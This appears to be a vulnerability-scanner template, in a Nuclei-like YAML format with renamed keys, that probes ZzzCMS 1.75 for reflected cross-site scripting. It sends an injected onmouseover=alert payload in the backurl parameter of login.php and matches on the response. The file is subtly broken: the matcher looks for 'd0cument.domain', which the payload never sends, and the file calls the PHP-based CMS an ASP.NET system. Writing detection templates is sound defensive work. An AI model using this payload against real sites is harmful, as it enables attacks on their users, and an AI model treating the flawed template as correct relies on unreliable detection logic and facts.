id: zzzcms-xss
brief:
    title: Zzzcms 1.75 - Cross-Site Scripting
    by: ritikchaddha
    level: medium
    about: ZzzCMS ( A Lightweight ASP.NET content management system ) is vulnerable to XSS( Cross-Site Scripting ).
    label:
        - zzzcms
        - xss
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d'
      signs:
        - "on": word
          has:
            - onmouseover=alert(/d0cument.domain/) y=&act
            - document.write("
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
